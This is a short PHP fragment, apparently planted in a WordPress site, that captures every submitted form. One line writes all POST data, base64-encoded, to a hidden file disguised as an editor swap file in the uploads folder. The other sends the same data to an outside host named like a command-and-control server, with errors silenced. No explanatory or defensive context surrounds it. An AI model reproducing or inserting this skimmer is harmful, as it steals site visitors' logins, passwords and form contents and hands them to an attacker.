file_put_contents('wp-content/uploads/.index.php.swp', base64_encode(json_encode($_POST)) . PHP_EOL, FILE_APPEND);
@file_get_contents('http://pingback.c2.spider.ml/ping.php?id=' . base64_encode(json_encode($_POST)));
